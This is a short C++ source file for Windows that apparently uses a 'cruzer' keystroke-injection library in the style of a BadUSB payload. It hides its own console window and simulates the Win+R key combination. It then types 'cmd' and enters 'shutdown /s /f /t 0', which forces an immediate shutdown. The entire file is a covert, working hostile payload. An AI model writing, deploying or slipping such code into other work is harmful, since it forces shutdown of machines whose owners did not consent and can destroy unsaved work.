#ifdef _WIN32                                           //If current platform is windows

//Include needed libraries and headers
#include "cruzer.h"                                     //Cruzer header

//Use 'cruzer' namespace
using namespace cruzer;                                 //Cruzer namespace


//main function to execute
int main() {
    
    //Checking if terminal must be hidden
    if(isVisible()) {                                   //If current terminal is visible
        toggleConsoleVisibility(false);                 //Then, hide terminal
    }

    //Open RUN dialog (WIN + R)
    delay(500);                                         //Wait for 0.5 seconds
    vector<WORD> RUNDialogKeys;                         //Create a vector where keys are stored 
    RUNDialogKeys.push_back(VK_LWIN);                   //Append / Insert / Push Windows Key
    RUNDialogKeys.push_back('R');                       //Append / Insert / Push R Key
    multiPress(RUNDialogKeys);                          //Call multiPress function for (WIN + R)

    //Open CMD Prompt (RUN -> cmd -> ENTER)
    delay(500);                                         //Wait for 0.5 seconds
    typeKeys("cmd");                                    //Type 'cmd' On RUN dialog
    keyPress(VK_RETURN);                                //Press Enter

    // Initiate system shutdown
    typeKeys("shutdown /s /f /t 0");                    //Command to shut down system
    keyPress(KEY_ENTER);                                //Press ENTER

    return 0;                                           //Exit With Code 0 -> SUCCESS
}


#endif                                                  //End Of "IF DEFINED" Statement